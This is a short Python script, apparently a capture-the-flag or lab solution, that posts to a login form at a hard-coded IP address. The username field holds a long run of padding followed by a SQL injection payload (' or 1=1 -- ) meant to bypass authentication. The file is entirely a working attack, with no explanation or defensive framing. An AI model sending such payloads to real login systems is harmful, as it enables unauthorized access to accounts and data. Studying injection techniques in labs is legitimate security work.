import requests

print(
	requests.post(
	"http://20.115.83.90:1339/",
	data={
	"username": "A" * 10000 + "' or 1=1 -- ",
	"login-submit": "1",
	"password": "admin"
	}
	).text
)
